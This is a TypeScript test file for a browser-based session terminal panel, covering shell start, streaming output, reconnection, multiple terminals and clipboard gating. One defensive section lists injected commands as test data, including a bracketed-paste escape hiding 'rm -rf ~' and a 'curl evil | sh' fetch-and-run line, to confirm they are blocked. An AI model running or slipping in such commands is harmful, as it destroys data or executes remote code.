// SPDX-FileCopyrightText: 2026 Olivares.AI
// SPDX-License-Identifier: AGPL-3.0-only
// Additional terms under AGPL-3.0-only section 7(a) disclaim warranty and limit liability: see DISCLAIMER.md at the repository root.
//
// The terminals of a folder: they start nothing until a person asks, hand the window size
// to the server, carry what is typed and what is printed, end cleanly, and outlive the view
// that shows them. xterm.js draws into a real browser's layout, which jsdom does not have, so
// a recording double stands in for it; the panel, the terminal store and the stream parser
// are the production ones.
import { render, screen, waitFor } from '@testing-library/react'
import userEvent from '@testing-library/user-event'
import { act } from 'react'
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'

const xterm = vi.hoisted(() => {
  interface Fake {
    rows: number
    cols: number
    written: string[]
    textarea: HTMLTextAreaElement
    disposed: boolean
    data: ((d: string) => void)[]
    resized: ((s: { rows: number; cols: number }) => void)[]
    selected: (() => void)[]
    selection: string
    keys: ((e: KeyboardEvent) => boolean)[]
  }
  // The clipboard providers the screens were given: what a program's OSC 52 reaches.
  const clipboard: { writeText: (s: string, t: string) => Promise<void> }[] = []
  return { terms: [] as Fake[], clipboard }
})

vi.mock('@xterm/xterm', () => {
  class Terminal {
    rows = 30
    cols = 100
    written: string[] = []
    textarea = document.createElement('textarea')
    disposed = false
    data: ((d: string) => void)[] = []
    resized: ((s: { rows: number; cols: number }) => void)[] = []
    options: Record<string, unknown> = {}
    unicode = { activeVersion: '6' }
    selected: (() => void)[] = []
    selection = ''
    keys: ((e: KeyboardEvent) => boolean)[] = []
    constructor(options: Record<string, unknown>) {
      this.options = options
      xterm.terms.push(this)
    }
    loadAddon() {}
    open(el: HTMLElement) {
      el.appendChild(this.textarea)
    }
    focus() {}
    write(bytes: Uint8Array) {
      this.written.push(new TextDecoder().decode(bytes))
    }
    // A paste reaches the shell as typed input, as a real screen sends it.
    paste(text: string) {
      this.data.forEach((cb) => cb(text))
    }
    attachCustomKeyEventHandler(cb: (e: KeyboardEvent) => boolean) {
      this.keys.push(cb)
    }
    hasSelection() {
      return this.selection !== ''
    }
    getSelection() {
      return this.selection
    }
    onData(cb: (d: string) => void) {
      this.data.push(cb)
      return { dispose() {} }
    }
    onResize(cb: (s: { rows: number; cols: number }) => void) {
      this.resized.push(cb)
      return { dispose() {} }
    }
    onSelectionChange(cb: () => void) {
      this.selected.push(cb)
      return { dispose() {} }
    }
    dispose() {
      this.disposed = true
    }
  }
  return { Terminal }
})
vi.mock('@xterm/addon-fit', () => ({
  FitAddon: class {
    fit() {}
  },
}))
vi.mock('@xterm/addon-search', () => ({
  SearchAddon: class {
    findNext() {
      return true
    }
    findPrevious() {
      return true
    }
    clearDecorations() {}
  },
}))
vi.mock('@xterm/addon-web-links', () => ({ WebLinksAddon: class {} }))
vi.mock('@xterm/addon-unicode11', () => ({ Unicode11Addon: class {} }))
vi.mock('@xterm/addon-clipboard', () => ({
  ClipboardAddon: class {
    constructor(
      _base: unknown,
      provider: { writeText: (s: string, t: string) => Promise<void> },
    ) {
      xterm.clipboard.push(provider)
    }
  },
}))
vi.mock('@xterm/addon-webgl', () => ({
  WebglAddon: class {
    onContextLoss() {}
    dispose() {}
  },
}))
vi.mock('@xterm/xterm/css/xterm.css', () => ({}))
// The person the terminals belong to: their list is kept for them in this browser.
vi.mock('@/lib/auth/context', () => ({
  useAuth: () => ({ principal: { kind: 'user', user_id: 'u1' } }),
}))
vi.mock('@/features/agentops/api', async (orig) => ({
  ...(await orig<typeof import('@/features/agentops/api')>()),
  agentOpsApi: {
    readFile: vi.fn(),
    startTerminal: vi.fn(),
    listTerminals: vi.fn(),
    terminalInput: vi.fn(),
    terminalSize: vi.fn(),
    closeTerminal: vi.fn(),
  },
}))

import { agentOpsApi } from '@/features/agentops/api'
import i18n from '@/lib/i18n'
import { ApiError } from '@/lib/api/errors'
import { MarkdownText } from './markdown-text'
import { RunInTerminalContext } from './run-in-terminal'
import { SessionTerminal, useTerminalGroup } from './session-terminal'
import { unsafeCommand } from './run-in-terminal'
import { clipboardWriteAllowed, resetTerminalGroups } from './terminal-store'

let push: (text: string) => void = () => {}
let end: () => void = () => {}
let streams = 0
let started = 0
// The open streams by terminal id: several terminals are read at once.
const feeds = new Map<string, { push: (t: string) => void; end: () => void }>()
let nextStatus: number[] = []

beforeEach(() => {
  vi.clearAllMocks()
  window.localStorage.clear()
  xterm.terms.length = 0
  xterm.clipboard.length = 0
  streams = 0
  started = 0
  feeds.clear()
  resetTerminalGroups()
  nextStatus = []
  vi.spyOn(globalThis, 'fetch').mockImplementation((async (
    input: RequestInfo | URL,
  ) => {
    // Only the terminal's stream stays open; anything else (a language dictionary) answers.
    if (!String(input).includes('/terminals/'))
      return new Response('{}', {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
      })
    const status = nextStatus.shift() ?? 200
    if (status !== 200) return new Response('{}', { status })
    streams++
    const enc = new TextEncoder()
    let controller!: ReadableStreamDefaultController<Uint8Array>
    const body = new ReadableStream<Uint8Array>({
      start(c) {
        controller = c
      },
    })
    push = (text) => controller.enqueue(enc.encode(text))
    end = () => controller.close()
    const id = /\/terminals\/([^/]+)\/stream/.exec(String(input))?.[1] ?? ''
    feeds.set(id, { push, end })
    return new Response(body, {
      status: 200,
      headers: { 'Content-Type': 'text/event-stream' },
    })
  }) as typeof fetch)
  vi.mocked(agentOpsApi.readFile).mockRejectedValue(
    new ApiError(404, 'not_found', 'absent'),
  )
  vi.mocked(agentOpsApi.startTerminal).mockImplementation(async () => ({
    terminal: `term_${++started}`,
    confinement: 'landlock',
    idle_seconds: 0,
    reconnect_seconds: 0,
  }))
  vi.mocked(agentOpsApi.listTerminals).mockResolvedValue({ items: [] })
  vi.mocked(agentOpsApi.terminalInput).mockResolvedValue({})
  vi.mocked(agentOpsApi.terminalSize).mockResolvedValue({})
  vi.mocked(agentOpsApi.closeTerminal).mockResolvedValue({ closed: true })
})

afterEach(() => {
  vi.restoreAllMocks()
})

const rememberTerminals = (ids: string[]) =>
  window.localStorage.setItem(
    `olivares.terminals.v2.${JSON.stringify([JSON.stringify(['user', 'u1']), '', 'ws_1'])}`,
    JSON.stringify({
      items: ids.map((id, i) => ({ id, title: `Terminal ${i + 1}` })),
      active: 0,
    }),
  )

const frame = (o: number, text: string) =>
  `event: out\ndata: {"o":${o},"d":"${btoa(text)}"}\n\n`

async function openIt() {
  const user = userEvent.setup()
  render(<SessionTerminal workspaceRef="ws_1" />)
  await user.click(screen.getByRole('button', { name: 'Open terminal' }))
  await waitFor(() => expect(streams).toBe(1))
  return user
}

describe('SessionTerminal', () => {
  it('starts nothing until a person asks', () => {
    render(<SessionTerminal workspaceRef="ws_1" />)
    const open = screen.getByRole('button', { name: 'Open terminal' })
    // The empty tab is its one action; what the shell is, is that action's hover.
    expect(screen.getByTestId('session-terminal').textContent).toBe(
      'Open terminal',
    )
    expect(open).toHaveAttribute(
      'title',
      expect.stringContaining('each command line you type is recorded'),
    )
    expect(agentOpsApi.startTerminal).not.toHaveBeenCalled()
    expect(streams).toBe(0)
    expect(xterm.terms).toHaveLength(0)
  })

  it('opens a shell at the size the screen has and prints what the shell prints', async () => {
    await openIt()
    expect(agentOpsApi.startTerminal).toHaveBeenCalledWith('ws_1', {
      rows: 30,
      cols: 100,
    })
    act(() => push(frame(0, 'olivares:~$ ')))
    await waitFor(() =>
      expect(xterm.terms[0].written).toEqual(['olivares:~$ ']),
    )
    expect(screen.getByRole('group', { name: 'Terminal' })).toBeInTheDocument()
  })

  it('names the input for a screen reader', async () => {
    await openIt()
    expect(xterm.terms[0].textarea.getAttribute('aria-label')).toBe(
      'Terminal input',
    )
  })

  it('carries what is typed to the shell and the window size when it changes', async () => {
    await openIt()
    act(() => xterm.terms[0].data.forEach((cb) => cb('git status\r')))
    await waitFor(() =>
      expect(agentOpsApi.terminalInput).toHaveBeenCalledWith(
        'ws_1',
        'term_1',
        'git status\r',
      ),
    )
    act(() =>
      xterm.terms[0].resized.forEach((cb) => cb({ rows: 12, cols: 40 })),
    )
    await waitFor(() =>
      expect(agentOpsApi.terminalSize).toHaveBeenCalledWith('ws_1', 'term_1', {
        rows: 12,
        cols: 40,
      }),
    )
  })

  it('gives a touch keyboard the keys it lacks', async () => {
    const user = await openIt()
    await user.click(screen.getByRole('button', { name: 'Ctrl+C' }))
    await waitFor(() =>
      expect(agentOpsApi.terminalInput).toHaveBeenCalledWith(
        'ws_1',
        'term_1',
        '\x03',
      ),
    )
  })

  it('asks before it closes a running shell, then ends it and returns to the idle panel', async () => {
    const user = await openIt()
    await user.click(screen.getByRole('button', { name: 'Close Terminal 1' }))
    // Nothing is ended until the person confirms.
    expect(agentOpsApi.closeTerminal).not.toHaveBeenCalled()
    await user.click(screen.getByRole('button', { name: 'Close terminal' }))
    expect(agentOpsApi.closeTerminal).toHaveBeenCalledWith('ws_1', 'term_1')
    expect(
      await screen.findByRole('button', { name: 'Open terminal' }),
    ).toBeInTheDocument()
    expect(xterm.terms[0].disposed).toBe(true)
  })

  it('says the shell ended and offers a new one', async () => {
    const user = await openIt()
    act(() => push('event: exit\ndata: {"code":0}\n\n'))
    expect(
      await screen.findByText('The terminal ended (exit 0).'),
    ).toBeInTheDocument()
    // An ended terminal closes without asking.
    await user.click(screen.getByRole('button', { name: 'Close Terminal 1' }))
    expect(agentOpsApi.closeTerminal).not.toHaveBeenCalled()
    expect(
      await screen.findByRole('button', { name: 'Open terminal' }),
    ).toBeInTheDocument()
  })

  it('says why a terminal was not opened and keeps the way to try again', async () => {
    vi.mocked(agentOpsApi.startTerminal).mockRejectedValueOnce(
      new ApiError(403, 'step_up_required', 'confirm'),
    )
    const user = userEvent.setup()
    render(<SessionTerminal workspaceRef="ws_1" />)
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    expect(await screen.findByRole('alert')).toHaveTextContent(
      'Confirm your identity first, then open the terminal again.',
    )
    expect(
      screen.getByRole('button', { name: 'Open terminal' }),
    ).toBeInTheDocument()
    expect(streams).toBe(0)
    // Asking again after the person has confirmed their identity opens the shell.
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await waitFor(() => expect(streams).toBe(1))
    expect(agentOpsApi.startTerminal).toHaveBeenCalledTimes(2)
    expect(screen.queryByRole('alert')).toBeNull()
  })

  it('returns to the idle panel, quietly, when the shell it remembers is gone', async () => {
    rememberTerminals(['term_gone'])
    nextStatus = [404]
    render(<SessionTerminal workspaceRef="ws_1" />)
    expect(
      await screen.findByRole('button', { name: 'Open terminal' }),
    ).toBeInTheDocument()
    expect(screen.queryByText(/ended/i)).toBeNull()
    expect(screen.queryByRole('alert')).toBeNull()
    expect(agentOpsApi.startTerminal).not.toHaveBeenCalled()
  })

  it('follows a change of language without restarting the terminal or opening another', async () => {
    await openIt()
    expect(xterm.terms[0].textarea.getAttribute('aria-label')).toBe(
      'Terminal input',
    )
    await act(() => i18n.changeLanguage('es'))
    try {
      await waitFor(() =>
        expect(xterm.terms[0].textarea.getAttribute('aria-label')).toBe(
          i18n.getFixedT('es', 'sessions')('terminal.input'),
        ),
      )
      expect(xterm.terms).toHaveLength(1)
      expect(xterm.terms[0].disposed).toBe(false)
      expect(agentOpsApi.startTerminal).toHaveBeenCalledTimes(1)
    } finally {
      await act(() => i18n.changeLanguage('en'))
    }
  })

  it('takes back the shell this browser had before a reload without a click', async () => {
    rememberTerminals(['term_7'])
    render(<SessionTerminal workspaceRef="ws_1" />)
    await waitFor(() => expect(streams).toBe(1))
    expect(agentOpsApi.startTerminal).not.toHaveBeenCalled()
    act(() => push(frame(0, 'still here')))
    await waitFor(() => expect(xterm.terms[0].written).toEqual(['still here']))
    act(() => end())
  })

  // The server keeps a shell until it is closed, so the view keeps asking for it: three
  // minutes without a connection (the limit was one) end nothing, and the stream resumes.
  it('keeps asking for a shell the server still holds, however long the connection stays down', async () => {
    vi.useFakeTimers({ toFake: ['setTimeout', 'clearTimeout'] })
    try {
      rememberTerminals(['term_9'])
      nextStatus = Array<number>(100).fill(503)
      render(<SessionTerminal workspaceRef="ws_1" />)
      await act(() => vi.advanceTimersByTimeAsync(180_000))
      expect(screen.queryByText(/ended/i)).toBeNull()
      expect(screen.getByRole('status')).toHaveTextContent('Reconnecting')
      nextStatus = []
      await act(() => vi.advanceTimersByTimeAsync(6_000))
      expect(streams).toBe(1)
      expect(agentOpsApi.startTerminal).not.toHaveBeenCalled()
    } finally {
      vi.useRealTimers()
    }
  })
})

describe('the terminals outlive the view', () => {
  it('finds the same screen, scrollback and stream when the view comes back', async () => {
    const user = userEvent.setup()
    const first = render(<SessionTerminal workspaceRef="ws_1" />)
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await waitFor(() => expect(streams).toBe(1))
    act(() => push(frame(0, 'build ok\r\n')))
    await waitFor(() =>
      expect(xterm.terms[0].written).toEqual(['build ok\r\n']),
    )

    // Another session is shown; this one's view is gone.
    first.unmount()
    expect(xterm.terms[0].disposed).toBe(false)

    // Output keeps arriving while nobody looks at it.
    act(() => push(frame(10, 'while away\r\n')))
    render(<SessionTerminal workspaceRef="ws_1" />)
    await screen.findByRole('tab', { name: 'Terminal 1' })
    await waitFor(() =>
      expect(xterm.terms[0].written).toEqual([
        'build ok\r\n',
        'while away\r\n',
      ]),
    )
    // Nothing was started again: one shell, one screen, one stream.
    expect(agentOpsApi.startTerminal).toHaveBeenCalledTimes(1)
    expect(xterm.terms).toHaveLength(1)
    expect(streams).toBe(1)
    expect(agentOpsApi.closeTerminal).not.toHaveBeenCalled()
  })

  it('keeps three terminals at once, each with its own stream, and closes one alone', async () => {
    const user = userEvent.setup()
    render(<SessionTerminal workspaceRef="ws_1" />)
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await waitFor(() => expect(streams).toBe(1))
    await user.click(screen.getByRole('button', { name: 'New terminal' }))
    await waitFor(() => expect(streams).toBe(2))
    await user.click(screen.getByRole('button', { name: 'New terminal' }))
    await waitFor(() => expect(streams).toBe(3))
    expect(screen.getAllByRole('tab')).toHaveLength(3)
    expect(agentOpsApi.startTerminal).toHaveBeenCalledTimes(3)

    // Each stream prints on its own screen.
    act(() => feeds.get('term_2')!.push(frame(0, 'second')))
    await waitFor(() => expect(xterm.terms[1].written).toEqual(['second']))
    expect(xterm.terms[0].written).toEqual([])

    await user.click(screen.getByRole('tab', { name: 'Terminal 2' }))
    await user.click(screen.getByRole('button', { name: 'Close Terminal 2' }))
    await user.click(screen.getByRole('button', { name: 'Close terminal' }))
    expect(agentOpsApi.closeTerminal).toHaveBeenCalledTimes(1)
    expect(agentOpsApi.closeTerminal).toHaveBeenCalledWith('ws_1', 'term_2')
    expect(screen.getAllByRole('tab')).toHaveLength(2)
    expect(xterm.terms[0].disposed).toBe(false)
    expect(xterm.terms[2].disposed).toBe(false)
  })

  it('splits to show a second terminal beside the first, and renames a terminal', async () => {
    const user = userEvent.setup()
    render(<SessionTerminal workspaceRef="ws_1" />)
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await waitFor(() => expect(streams).toBe(1))
    expect(screen.getAllByTestId('terminal-screen')).toHaveLength(1)
    await user.click(screen.getByRole('button', { name: 'Split' }))
    await waitFor(() => expect(streams).toBe(2))
    await waitFor(() =>
      expect(screen.getAllByTestId('terminal-screen')).toHaveLength(2),
    )
    await user.click(screen.getByRole('button', { name: 'Close split' }))
    await waitFor(() =>
      expect(screen.getAllByTestId('terminal-screen')).toHaveLength(1),
    )

    await user.dblClick(screen.getByRole('tab', { name: 'Terminal 2' }))
    const name = screen.getByRole('textbox', { name: 'Rename terminal' })
    await user.clear(name)
    await user.type(name, 'server{Enter}')
    expect(
      await screen.findByRole('tab', { name: 'server' }),
    ).toBeInTheDocument()
  })

  it('remembers the terminals of this browser across a reload and resumes each without starting one', async () => {
    rememberTerminals(['term_a', 'term_b', 'term_c'])
    render(<SessionTerminal workspaceRef="ws_1" />)
    await waitFor(() => expect(streams).toBe(3))
    expect(screen.getAllByRole('tab')).toHaveLength(3)
    expect(agentOpsApi.startTerminal).not.toHaveBeenCalled()
    expect(Array.from(feeds.keys()).sort()).toEqual([
      'term_a',
      'term_b',
      'term_c',
    ])
  })
})

describe('a command a person chose to run', () => {
  it('runs in a new terminal once it is live, and in the open one when there is one', async () => {
    const user = userEvent.setup()
    vi.mocked(agentOpsApi.readFile).mockImplementation(async (_ref, path) => {
      if (path !== 'package.json')
        throw new ApiError(404, 'not_found', 'absent')
      return {
        path,
        size: 60,
        encoding: 'utf-8',
        content: JSON.stringify({ scripts: { dev: 'vite', test: 'vitest' } }),
      }
    })
    render(<SessionTerminal workspaceRef="ws_1" />)
    await user.click(await screen.findByRole('button', { name: 'Run dev' }))
    await waitFor(() =>
      expect(agentOpsApi.terminalInput).toHaveBeenCalledWith(
        'ws_1',
        'term_1',
        "npm run -- 'dev'\r",
      ),
    )
    // The second command goes to the terminal that is open, not to a third one.
    await user.click(screen.getByRole('button', { name: 'Terminal actions' }))
    await user.click(await screen.findByRole('menuitem', { name: /Run test/ }))
    await waitFor(() =>
      expect(agentOpsApi.terminalInput).toHaveBeenCalledWith(
        'ws_1',
        'term_1',
        "npm run -- 'test'\r",
      ),
    )
    expect(agentOpsApi.startTerminal).toHaveBeenCalledTimes(1)
  })
})

describe('Run in terminal on a code block of the conversation', () => {
  const reply = '```sh\nnpm test\n```\n\n```ts\nconst x = 1\n```'

  it('runs a shell block in the session terminal, and offers it on no other block', async () => {
    const user = userEvent.setup()
    const run = vi.fn()
    render(
      <RunInTerminalContext.Provider value={{ run }}>
        <MarkdownText text={reply} />
      </RunInTerminalContext.Provider>,
    )
    const buttons = screen.getAllByRole('button', { name: 'Run in terminal' })
    expect(buttons).toHaveLength(1) // the ts block has none
    await user.click(buttons[0]!)
    expect(run).toHaveBeenCalledWith('npm test')
  })

  it('offers nothing where the session has no terminal', () => {
    render(<MarkdownText text={reply} />)
    expect(screen.queryByRole('button', { name: 'Run in terminal' })).toBeNull()
  })
})

describe('terminal output for the agent', () => {
  it('offers the selected output with the terminal name, and only when something is selected', async () => {
    const user = userEvent.setup()
    const onSendToAgent = vi.fn()
    render(
      <SessionTerminal workspaceRef="ws_1" onSendToAgent={onSendToAgent} />,
    )
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await waitFor(() => expect(streams).toBe(1))
    const actions = screen.getByRole('button', { name: 'Terminal actions' })
    await user.click(actions)
    expect(
      await screen.findByRole('menuitem', { name: 'Send to agent' }),
    ).toHaveAttribute('aria-disabled', 'true')
    await user.keyboard('{Escape}')
    act(() => {
      xterm.terms[0].selection = 'FAIL: 2 tests'
      xterm.terms[0].selected.forEach((cb) => cb())
    })
    await user.click(actions)
    await user.click(
      await screen.findByRole('menuitem', { name: 'Send to agent' }),
    )
    expect(onSendToAgent).toHaveBeenCalledWith('FAIL: 2 tests', 'Terminal 1')
  })

  it('offers nothing to send where the host cannot carry it', async () => {
    const user = userEvent.setup()
    render(<SessionTerminal workspaceRef="ws_1" />)
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await waitFor(() => expect(streams).toBe(1))
    await user.click(screen.getByRole('button', { name: 'Terminal actions' }))
    await screen.findByRole('menuitem', { name: 'Copy' })
    expect(screen.queryByRole('menuitem', { name: 'Send to agent' })).toBeNull()
  })
})

describe('the actions of a terminal', () => {
  it('opens on a right-click of the screen, with no text buttons around it', async () => {
    const user = userEvent.setup()
    render(<SessionTerminal workspaceRef="ws_1" onSendToAgent={vi.fn()} />)
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await waitFor(() => expect(streams).toBe(1))
    expect(screen.queryByRole('button', { name: 'Copy' })).toBeNull()
    expect(screen.queryByRole('button', { name: 'Paste' })).toBeNull()
    await user.pointer({
      keys: '[MouseRight]',
      target: screen.getByTestId('terminal-screen'),
    })
    for (const name of [
      'Send to agent',
      'Copy',
      'Paste',
      'Select all',
      'Jump to latest',
    ])
      expect(await screen.findByRole('menuitem', { name })).toBeVisible()
    await user.click(screen.getByRole('menuitem', { name: 'Stop' }))
    expect(agentOpsApi.terminalInput).toHaveBeenLastCalledWith(
      'ws_1',
      'term_1',
      '\x03',
    )
  })
})

it('runs a declared test script in the session terminal and shows its output', async () => {
  vi.mocked(agentOpsApi.readFile).mockImplementation(async (_ref, path) => {
    if (path !== 'package.json') throw new ApiError(404, 'not_found', 'absent')
    return {
      path,
      size: 60,
      encoding: 'utf-8',
      content: JSON.stringify({ scripts: { test: 'printf script-passed' } }),
    }
  })
  const user = userEvent.setup()
  render(<SessionTerminal workspaceRef="ws_1" />)
  const run = await screen.findByRole('button', { name: 'Run test' })
  expect(agentOpsApi.startTerminal).not.toHaveBeenCalled()
  await user.click(run)
  await waitFor(() =>
    expect(agentOpsApi.terminalInput).toHaveBeenCalledWith(
      'ws_1',
      'term_1',
      "npm run -- 'test'\r",
    ),
  )
  // The line is cleared first, so the command never joins what was typed before it.
  expect(agentOpsApi.terminalInput).toHaveBeenNthCalledWith(
    1,
    'ws_1',
    'term_1',
    '\x15',
  )
  act(() => push(frame(0, 'script-passed')))
  await waitFor(() => expect(xterm.terms[0].written).toContain('script-passed'))
  await user.click(screen.getByRole('button', { name: 'Terminal actions' }))
  await user.click(await screen.findByRole('menuitem', { name: 'Stop' }))
  expect(agentOpsApi.terminalInput).toHaveBeenLastCalledWith(
    'ws_1',
    'term_1',
    '\x03',
  )
})

const held = (...ids: string[]) => ({
  items: ids.map((terminal) => ({
    terminal,
    confinement: 'landlock',
    started_at: '2026-11-09T12:00:00Z',
  })),
})

describe('terminals this browser lost the ids of', () => {
  it('takes back what the server holds for this person, without starting a shell', async () => {
    vi.mocked(agentOpsApi.listTerminals).mockResolvedValue(
      held('term_x', 'term_y'),
    )
    render(<SessionTerminal workspaceRef="ws_1" />)
    await waitFor(() => expect(streams).toBe(2))
    expect(screen.getAllByRole('tab')).toHaveLength(2)
    expect(Array.from(feeds.keys()).sort()).toEqual(['term_x', 'term_y'])
    expect(agentOpsApi.startTerminal).not.toHaveBeenCalled()
  })

  it('shows them when the limit refuses a new terminal, so one can be closed', async () => {
    const user = userEvent.setup()
    render(<SessionTerminal workspaceRef="ws_1" />)
    await screen.findByRole('button', { name: 'Open terminal' })
    vi.mocked(agentOpsApi.startTerminal).mockRejectedValueOnce(
      new ApiError(429, 'too_many', 'busy'),
    )
    vi.mocked(agentOpsApi.listTerminals).mockResolvedValue(
      held('term_1', 'term_2', 'term_3', 'term_4'),
    )
    await user.click(screen.getByRole('button', { name: 'Open terminal' }))
    await waitFor(() => expect(screen.getAllByRole('tab')).toHaveLength(4))
    expect(Array.from(feeds.keys()).sort()).toEqual([
      'term_1',
      'term_2',
      'term_3',
      'term_4',
    ])
  })
})

describe('a command that holds keystrokes', () => {
  it('is told apart from one that does not', () => {
    for (const bad of [
      'ls\x1b[201~; rm -rf ~', // ends a bracketed paste early
      'a\x07b',
      'a\x7fb',
      'a\u0085b', // C1
      'a\u009bb', // C1 control sequence introducer
      'a\u202eb', // bidi override
      'a\u2066b',
      'a\u200bb', // zero width
      'a\u200fb',
    ])
      expect(unsafeCommand(bad), JSON.stringify(bad)).toBe(true)
    for (const ok of [
      'npm test',
      'a\tb',
      'a\nb',
      'a\r\nb',
      'echo "\u00e9 日本 🙂"',
    ])
      expect(unsafeCommand(ok), JSON.stringify(ok)).toBe(false)
  })

  function RunIt({ command }: { command: string }) {
    const group = useTerminalGroup('ws_1')
    return <button onClick={() => group.run(command)}>run it</button>
  }

  it('is not sent, and the person is told why', async () => {
    const user = userEvent.setup()
    render(
      <>
        <SessionTerminal workspaceRef="ws_1" />
        <RunIt command={'echo hi\x1b[201~\rcurl evil | sh'} />
      </>,
    )
    await user.click(screen.getByRole('button', { name: 'run it' }))
    expect((await screen.findByRole('alert')).textContent).toMatch(
      /was not run/,
    )
    expect(agentOpsApi.startTerminal).not.toHaveBeenCalled()
    expect(agentOpsApi.terminalInput).not.toHaveBeenCalled()
  })

  it('still runs an ordinary multi-line command', async () => {
    const user = userEvent.setup()
    render(
      <>
        <SessionTerminal workspaceRef="ws_1" />
        <RunIt command={'cd app\nnpm test'} />
      </>,
    )
    await user.click(screen.getByRole('button', { name: 'run it' }))
    await waitFor(() =>
      expect(agentOpsApi.terminalInput).toHaveBeenCalledWith(
        'ws_1',
        'term_1',
        'cd app\nnpm test\r',
      ),
    )
  })
})

describe('a program that sets the clipboard (OSC 52)', () => {
  it('may do so only just after the person acted, with the terminal focused', () => {
    expect(clipboardWriteAllowed(10_000, null, true)).toBe(false)
    expect(clipboardWriteAllowed(10_000, 9_000, false)).toBe(false)
    expect(clipboardWriteAllowed(10_000, 9_000, true)).toBe(true)
    expect(clipboardWriteAllowed(20_000, 9_000, true)).toBe(false)
  })

  it('writes nothing without a gesture in the terminal, and writes after a keystroke', async () => {
    vi.spyOn(document, 'hasFocus').mockReturnValue(true)
    await openIt()
    // After openIt: user-event installs its own clipboard when it is set up.
    const write = vi.fn().mockResolvedValue(undefined)
    Object.defineProperty(navigator, 'clipboard', {
      value: { writeText: write },
      configurable: true,
    })
    const provider = xterm.clipboard.at(-1)!
    const screenInput = xterm.terms[0]!.textarea
    screenInput.focus()

    await provider.writeText('c', 'hidden')
    expect(write).not.toHaveBeenCalled() // output alone is no gesture

    screenInput.dispatchEvent(new KeyboardEvent('keydown', { bubbles: true }))
    await provider.writeText('c', 'copied')
    expect(write).toHaveBeenCalledWith('copied')

    screenInput.blur()
    write.mockClear()
    await provider.writeText('c', 'unfocused')
    expect(write).not.toHaveBeenCalled()
  })
})
